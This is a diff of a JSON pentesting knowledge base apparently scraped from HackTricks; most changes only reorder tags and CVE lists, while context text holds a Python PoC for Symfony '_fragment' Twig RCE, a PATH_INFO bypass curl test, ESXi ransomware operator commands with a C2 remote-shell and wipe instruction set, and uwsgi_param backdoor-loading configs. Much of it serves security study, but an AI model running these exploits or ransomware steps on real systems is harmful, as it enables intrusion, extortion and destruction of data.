**Profiler** & debug toolbar)\n  * `/_wdt/<token>` (“Web Debug Toolbar”)  \n  * `/_error/{code}.{_format}` (pretty error pages)  \n  * `/app_dev.php`, `/config.php`, `/config_dev.php` (pre-4.0 dev front-controllers)\n* Wappalyzer, BuiltWith or ffuf/feroxbuster wordlists: `symfony.txt` → look for `/_fragment`, `/_profiler`, `.env`, `.htaccess`.\n\n## Interesting files & endpoints\n| Path | Why it matters |\n|------|----------------|\n| `/.env`, `/.env.local`, `/.env.prod` | Frequently mis-deployed → leaks `APP_SECRET`, DB creds, SMTP, AWS keys |\n| `/.git`, `.svn`, `.hg` | Source disclosure → credentials + business logic |\n| `/var/log/*.log`, `/log/dev.log` | Web-root mis-configuration exposes stack-traces |\n| `/_profiler` | Full request history, configuration, service container, **APP_SECRET** (≤ 3.4) |\n| `/_fragment` | Entry point used by ESI/HInclude.  Abuse possible once you know `APP_SECRET` |\n| `/vendor/phpunit/phpunit/phpunit` | PHPUnit RCE if accessible (CVE-2017-9841) |\n| `/index.php/_error/{code}` | Finger-print & sometimes leak exception traces |\n\n---\n\n## 1. APP_SECRET disclosure ➜ RCE via `/_fragment` (aka “secret-fragment”)\n* **CVE-2019-18889** originally, but *still* appears on modern targets when debug is left enabled or `.env` is exposed.\n* Once you know the 32-char `APP_SECRET`, craft an HMAC token and abuse the internal `render()` controller to execute arbitrary Twig:\n  ```python\n  # PoC – requires the secret\n  import hmac, hashlib, requests, urllib.parse as u\n  secret = bytes.fromhex('deadbeef…')\n  payload = \"{{['id']|filter('system')}}\"   # RCE in Twig\n  query = {\n      'template': '@app/404.html.twig',\n      'filter': 'raw',\n      '_format': 'html',\n      '_locale': 'en',\n      'globals[cmd]': 'id'\n  }\n  qs = u.urlencode(query, doseq=True)\n  token = hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest()\n  r = requests.get(f\"https://target/_fragment?{qs}&_token={token}\")\n  print(r.text)\n  ```\n* Excellent write-up & exploitation script: Ambionics blog (linked in References).\n\n## 2. PATH_INFO auth bypass – **CVE-2025-64500** (HttpFoundation)\n* Affects versions below 5.4.50, 6.4.29 and 7.3.7. Path normalization could drop the leading `/`, breaking access-control rules that assume `/admin` etc.\n* Quick test: `curl -H 'PATH_INFO: admin/secret' https://target/index.php` → if it reaches admin routes without auth, you found it.\n* Patch by upgrading `symfony/http-foundation` or the full framework to the fixed patch level.\n\n## 3. MSYS2/Git-Bash argument mangling – **CVE-2026-24739** (Process)\n* Affects versions below 5.4.51, 6.4.33, 7.3.11, 7.4.5 and 8.0.5 on Windows when PHP is run from MSYS2 (Git-Bash, mingw). `Process` fails to quote `=` leading to corrupted paths; destructive commands (`rmdir`, `del`) may target unintended dirs.\n* If you can upload a PHP script or influence Composer/CLI helpers that call `Process`, craft arguments with `=` (e.g. `E:/=tmp/delete`) to cause path re-write.\n\n## 4. Runtime env/argv injection – **CVE-2024-50340** (Runtime)\n* When `register_argv_argc=On` and using non-SAPI runtimes, crafted query strings could flip `APP_ENV`/`APP_DEBUG` via `argv` parsing. Patched in 5.4.46/6.4.14/7.1.7.\n* Look for `/?--env=prod` or similar being accepted in logs.\n\n## 5. URL validation / open redirect – **CVE-2024-50345** (HttpFoundation)\n* Special characters in the URI were not validated the same way browsers do, enabling redirect to attacker-controlled domains. Fixed in 5.4.46/6.4.14/7.1.7.\n\n## 6. Symfony UX attribute injection – **CVE-2025-47946**\n* `symfony/ux-twig-component` & `symfony/ux-live-component` before **2.25.1** render `{{ attributes }}` without escaping → attribute injection/XSS. If the app lets users define component attributes (admin CMS, email templating) you can cha",
@@ -20700,8 +20700,8 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "symphony",
-   "0"
+   "0",
+   "symphony"
   ]
  },
  {
@@ -20732,8 +20732,8 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "cve-2025-3600",
    "CVE-2025-34509",
+   "cve-2025-3600",
    "CVE-2025-3600"
   ],
   "privilege_escalation": [],
@@ -20742,8 +20742,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "telerik ui aspnet ajax unsafe reflection webresource axd",
-   "0"
+   "0",
+   "telerik ui aspnet ajax unsafe reflection webresource axd"
   ]
  },
  {
@@ -20862,11 +20862,11 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "readme",
+   "0",
    "auxiliary/scanner/http/tomcat_enum",
-   "auxiliary/scanner/http/tomcat_mgr_login",
    "exploit/multi/http/tomcat_mgr_upload",
-   "0"
+   "readme",
+   "auxiliary/scanner/http/tomcat_mgr_login"
   ]
  },
  {
@@ -20955,8 +20955,8 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2025-41244",
-   "cve-2025-41244"
+   "cve-2025-41244",
+   "CVE-2025-41244"
   ],
   "privilege_escalation": [],
   "methodology": "## Enumeration\n```bash\nnmap -sV --script \"http-vmware-path-vuln or vmware-version\" -p <PORT> <IP>\nmsf> use auxiliary/scanner/vmware/esx_fingerprint\nmsf> use auxiliary/scanner/http/ms15_034_http_sys_memory_dump\n```\n\n## Bruteforce\n```bash\nmsf> auxiliary/scanner/vmware/vmware_http_login\n```\n\nIf you find valid credentials, you can use more metasploit scanner modules to obtain information.\n\n## Attack Workflow inside Virtual Estates\n* **Develop**: maintain a lightweight management agent (e.g., *MrAgent*), encryptor (e.g., *Mario*), and leak infrastructure.\n* **Infiltrate**: compromise vSphere management, enumerate hosts, steal data, and stage payloads.\n* **Deploy**: push agents to each ESXi host, let them poll C2, and pull the encryptor when instructed.\n* **Extort**: leak proof-of-compromise data and run ransom chats once encryption is confirmed.\n\n## Hypervisor Takeover Primitives\nOnce command execution on an ESXi console/SSH session is obtained, attackers typically run the following management commands to fingerprint and isolate the host before ransomware deployment:\n\n```bash\nuname -a                                   # hostname / build metadata for tracking\nesxcli --formatter=csv network nic list    # adapter + MAC inventory\nesxcli --formatter=csv network ip interface ipv4 get\nesxcli network firewall set --enabled false\n/etc/init.d/vpxa stop                      # cut vCenter off from the host\npasswd root                                # rotate credentials under attacker control\n```\n\nThe same agent usually keeps a persistent loop that polls a hard-coded C2 URI. Any unreachable status triggers retries, meaning the beacon stays live until operators push instructions.\n\n## MrAgent-Style Instruction Channel\nLightweight management agents expose a concise instruction set parsed from the C2 queue. That set is enough to operate dozens of compromised hypervisors without interactive shells:\n\n| Instruction | Effect |\n| --- | --- |\n| `Config` | Overwrite the local JSON config that defines target directories, execution delays or throttling, enabling hot re-tasking without redeploying binaries. |\n| `Info` | Return hypervisor build info, IPs and adapter metadata gathered with the `uname`/`esxcli` probes. |\n| `Exec` | Kick off the ransomware phase: change `root` credentials, stop `vpxa`, optionally schedule a reboot delay and then pull+execute the encryptor. |\n| `Run` | Implement a remote shell by writing arbitrary C2-provided commands to `./shmv`, chmod +x and execute it. |\n| `Remove` | Issue `rm -rf <path>` for tool clean-up or destructive wiping. |\n| `Abort` / `Abort_f` | Stop queued encryptions or kill running worker threads if the operator wants to pause post-reboot actions. |\n| `Quit` | Termina\n\n## Virtualization & Backup-Aware Targeting\nMario-like encryptors only traverse operator-supplied directory roots and touch virtualization artefacts that matter for business continuity:\n\n| Extension | Target |\n| --- | --- |\n| `vmdk`, `vmem`, `vmsd`, `vmsn`, `vswp` | VM disks, memory snapshots and swap backing files. |\n| `ova`, `ovf` | Portable VM appliance bundles/metadata. |\n| `vib` | ESXi installation bundles that can block remediation/patching. |\n| `vbk`, `vbm` | Veeam VM backups + metadata to sabotage on-box restores. |\n\nOperational quirks:\n\n* Every visited directory receives `How To Restore Your Files.txt` before encryption to ensure ransom channels are advertised even on disconnected hosts.\n* Already processed files are skipped when their names contain `.emario`, `.marion`, `.lmario`, `.nmario`, `.mmario` or `.wmario`, preventing double encryption that would break the attackers' decryptor.\n* Encrypted payloads are renamed with a `*.mario`-style suffix (commonly `.emario`) so operators can verify coverage remotely in consol\n\n## Layered Encryption Upgrades\nRecent Mario builds replace the original linear, single-key routine with a sparse, multi-key design optimised for multi-hundred-gigabyte VMDKs:\n\n* **Key schedule**: Generate a 32-byte primary key (stored around `var_1150`) and an independent 8-byte secondary key (`var_20`). Data is first transformed with the primary context and then re-mixed with the secondary key before disk writes.\n* **Per-file headers**: Metadata buffers (e.g. `var_40`) track chunk maps and flags so the attackers' private decryptor can reconstruct the sparse layout.\n* **Dynamic chunking**: Instead of a constant `0xA00000` loop, chunk size and offsets are recomputed based on file size, with thresholds extended up to ~8 GB to match modern VM images.\n* **Sparse coverage**: Only strategically chosen regions are touched, dramatically reducing runtime while still corrupting VMFS metadata, NTFS/EXT4 structures inside the guest or backup indexes.\n* **Instrumentation**: Upgraded builds log per-chunk byte counts and totals (e\n\n## See also\nLinux LPE via VMware Tools service discovery (CWE-426 / CVE-2025-41244):\n\n{{#ref}}\n../../linux-hardening/privilege-escalation/vmware-tools-service-discovery-untrusted-search-path-c",
@@ -20964,11 +20964,11 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
+   "0",
    "auxiliary/scanner/vmware/vmware_http_login",
    "vmware esx vcenter...",
    "auxiliary/scanner/http/ms15_034_http_sys_memory_dump",
-   "auxiliary/scanner/vmware/esx_fingerprint",
-   "0"
+   "auxiliary/scanner/vmware/esx_fingerprint"
   ]
  },
  {
@@ -20994,8 +20994,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "0",
-   "vuejs"
+   "vuejs",
+   "0"
   ]
  },
  {
@@ -21054,8 +21054,8 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2025-59305",
-   "cve-2025-59305"
+   "cve-2025-59305",
+   "CVE-2025-59305"
   ],
   "privilege_escalation": [],
   "methodology": "## API Pentesting Methodology Summary\nPentesting APIs involves a structured approach to uncovering vulnerabilities. This guide encapsulates a comprehensive methodology, emphasizing practical techniques and tools.\n\n## **Understanding API Types**\n- **SOAP/XML Web Services**: Utilize the WSDL format for documentation, typically found at `?wsdl` paths. Tools like **SOAPUI** and **WSDLer** (Burp Suite Extension) are instrumental for parsing and generating requests. Example documentation is accessible at [DNE Online](http://www.dneonline.com/calculator.asmx).\n- **REST APIs (JSON)**: Documentation often comes in WADL files, yet tools like [Swagger UI](https://swagger.io/tools/swagger-ui/) provide a more user-friendly interface for interaction. **Postman** is a valuable tool for creating and managing example requests.\n- **GraphQL**: A query language for APIs offering a complete and understandable description of the data in your API.\n\n## **Practice Labs**\n- [**VAmPI**](https://github.com/erev0s/VAmPI): A deliberately vulnerable API for hands-on practice, covering the OWASP top 10 API vulnerabilities.\n\n## **Effective Tricks for API Pentesting**\n- **SOAP/XML Vulnerabilities**: Explore XXE vulnerabilities, although DTD declarations are often restricted. CDATA tags may allow payload insertion if the XML remains valid.\n- **Privilege Escalation**: Test endpoints with varying privilege levels to identify unauthorized access possibilities.\n- **CORS Misconfigurations**: Investigate CORS settings for potential exploitability through CSRF attacks from authenticated sessions.\n- **Endpoint Discovery**: Leverage API patterns to discover hidden endpoints. Tools like fuzzers can automate this process.\n- **Parameter Tampering**: Experiment with adding or replacing parameters in requests to access unauthorized data or functionalities.\n- **HTTP Method Testing**: Vary request methods (GET, POST, PUT, DELETE, PATCH) to uncover unexpected behaviors or information disclosures.\n- **Content-Type Manipulation**: Switch between different content types (x-www-form-urlencoded, application/xml, application/json) to test for parsing issues or vulnerabilit\n\n## Authorization & Business Logic (AuthN != AuthZ) — tRPC/Zod protectedProcedure pitfalls\nModern TypeScript stacks commonly use tRPC with Zod for input validation. In tRPC, `protectedProcedure` typically ensures the request has a valid session (authentication) but does not imply the caller has the right role/permissions (authorization). This mismatch leads to Broken Function Level Authorization/BOLA if sensitive procedures are only gated by `protectedProcedure`.\n\n- Threat model: Any low-privileged authenticated user can call admin-grade procedures if role checks are missing (e.g., background migrations, feature flags, tenant-wide maintenance, job control).\n- Black-box signal: `POST /api/trpc/<router>.<procedure>` endpoints that succeed for basic accounts when they should be admin-only. Self-serve signups drastically increase exploitability.\n- Typical tRPC route shape (v10+): JSON body wrapped under `{\"input\": {...}}`.\n\nExample vulnerable pattern (no role/permission gate):\n\n```ts\n// The endpoint for retrying a migration job\n// This checks for a valid session (authentication)\n\n## **Tools and Resources for API Pentesting**\n- [**kiterunner**](https://github.com/assetnote/kiterunner): Excellent for discovering API endpoints. Use it to scan and brute force paths and parameters against target APIs.\n\n```bash\nkr scan https://domain.com/api/ -w routes-large.kite -x 20\nkr scan https://domain.com/api/ -A=apiroutes-220828 -x 20\nkr brute https://domain.com/api/ -A=raft-large-words -x 20 -d=0\nkr brute https://domain.com/api/ -w /tmp/lang-english.txt -x 20 -d=0\n```\n\n- [**https://github.com/BishopFox/sj**](https://github.com/BishopFox/sj): sj is a command line tool designed to assist with auditing of **exposed Swagger/OpenAPI definition files** by checking the associated API endpoints for weak authentication. It also provides command templates for manual vulnerability testing.\n- Additional tools like **automatic-api-attack-tool**, **Astra**, and **restler-fuzzer** offer tailored functionalities for API security testing, ranging from attack simulation to fuzzing and vulnerability scanning.\n- [**Cherrybomb**](https://gi\n\n## **Learning and Practice Resources**\n- **OWASP API Security Top 10**: Essential reading for understanding common API vulnerabilities ([OWASP Top 10](https://github.com/OWASP/API-Security/blob/master/2019/en/dist/owasp-api-security-top-10.pdf)).\n- **API Security Checklist**: A comprehensive checklist for securing APIs ([GitHub link](https://github.com/shieldfy/API-Security-Checklist)).\n- **Logger++ Filters**: For hunting API vulnerabilities, Logger++ offers useful filters ([GitHub link](https://github.com/bnematzadeh/LoggerPlusPlus-API-Filters)).\n- **API Endpoints List**: A curated list of potential API endpoints for testing purposes ([GitHub gist](https://gist.github.com/yassineaboukir/8e12adef",
@@ -21163,11 +21163,11 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)",
+   "0",
    "werkzeug",
    "post/twisty-python),",
-   "post/twisty-python**](https://mizu.re/post/twisty-python)",
-   "0"
+   "exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)",
+   "post/twisty-python**](https://mizu.re/post/twisty-python)"
   ]
  },
  {
@@ -21680,8 +21680,8 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2023-27522",
-   "CVE-2024-24795"
+   "CVE-2024-24795",
+   "CVE-2023-27522"
   ],
   "privilege_escalation": [],
   "methodology": "## WSGI Overview\nWeb Server Gateway Interface (WSGI) is a specification that describes how a web server communicates with web applications, and how web applications can be chained together to process one request. uWSGI is one of the most popular WSGI servers, often used to serve Python web applications. Its native binary transport is the uwsgi protocol (lowercase) which carries a bag of key/value parameters (\"uwsgi params\") to the backend application server.\n\nRelated pages you may also want to check:\n\n{{#ref}}\nwerkzeug.md\n{{#endref}}\n\n{{#ref}}\n../../pentesting-web/ssrf-server-side-request-forgery/README.md\n{{#endref}}\n\n## uWSGI Magic Variables Exploitation\nuWSGI provides special \"magic variables\" that can change how the instance loads and dispatches applications. These variables are not normal HTTP headers — they are uwsgi parameters carried inside the uwsgi/SCGI/FastCGI request from the reverse proxy (nginx, Apache mod_proxy_uwsgi, etc.) to the uWSGI backend. If a proxy configuration maps user-controlled data into uwsgi parameters (for example via `$arg_*`, `$http_*`, or unsafely exposed endpoints that talk the uwsgi protocol), attackers can set these variables and achieve code execution.\n\n## Dangerous mappings in front proxies (nginx example)\nMisconfigurations like the following directly expose uWSGI magic variables to user input:\n\n```\nlocation /app/ {\n  include uwsgi_params;\n  # DANGEROUS: maps query args into uwsgi params\n  uwsgi_param UWSGI_FILE $arg_f;                 # /app/?f=/tmp/backdoor.py\n  uwsgi_param UWSGI_MODULE $http_x_mod;          # header: X-Mod: pkg.mod\n  uwsgi_param UWSGI_CALLABLE $arg_c;             # /app/?c=application\n  uwsgi_pass unix:/run/uwsgi/app.sock;\n}\n```\n\nIf the app or upload feature allows writing files under a predictable path, combining it with the mappings above usually results in immediate RCE when the backend loads the attacker-controlled file/module.\n\n## `UWSGI_FILE` - Arbitrary File Load/Execute\n```\nuwsgi_param UWSGI_FILE /path/to/python/file.py;\n```\nLoads and executes an arbitrary Python file as a WSGI application. If an attacker can control this parameter through the uwsgi param bag, they can achieve Remote Code Execution (RCE).\n\n## `UWSGI_SCRIPT` - Script Loading\n```\nuwsgi_param UWSGI_SCRIPT module.path:callable;\nuwsgi_param SCRIPT_NAME /endpoint;\n```\nLoads a specified script as a new application. Combined with file upload or write capabilities, this can lead to RCE.\n\n## `UWSGI_MODULE` and `UWSGI_CALLABLE` - Dynamic Module Loading\n```\nuwsgi_param UWSGI_MODULE malicious.module;\nuwsgi_param UWSGI_CALLABLE evil_function;\nuwsgi_param SCRIPT_NAME /backdoor;\n```\nThese parameters allow loading arbitrary Python modules and calling specific functions within them.\n\n## `UWSGI_SETENV` - Environment Variable Manipulation\n```\nuwsgi_param UWSGI_SETENV DJANGO_SETTINGS_MODULE=malicious.settings;\n```\nCan be used to modify environment variables, potentially affecting application behavior or loading malicious configuration.\n\n## `UWSGI_PYHOME` - Python Environment Manipulation\n```\nuwsgi_param UWSGI_PYHOME /path/to/malicious/venv;\n```\nChanges the Python virtual environment, potentially loading malicious packages or different Python interpreters.\n\n## `UWSGI_CHDIR` - Directory Change\n```\nuwsgi_param UWSGI_CHDIR /etc/;\n```\nChanges the working directory before processing requests and may be combined with other features.\n\n## Threat model\nIf the target web app exposes an SSRF primitive and the uWSGI instance listens on an internal TCP socket (for example, `socket = 127.0.0.1:3031`), you can talk the raw uwsgi protocol via gopher and inject uWSGI magic variables.\n\nThis is possible because many deployments use a non-HTTP uwsgi socket internally; the reverse proxy (nginx/Apache) translates client HTTP into the uwsgi param bag. With SSRF+gopher you can directly craft the uwsgi binary packet and set dangerous variables like `UWSGI_FILE`.",
@@ -21689,8 +21689,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "0",
-   "wsgi"
+   "wsgi",
+   "0"
   ]
  },
  {
@@ -21760,8 +21760,8 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "zabbix",
-   "0"
+   "0",
+   "zabbix"
   ]
  },
  {
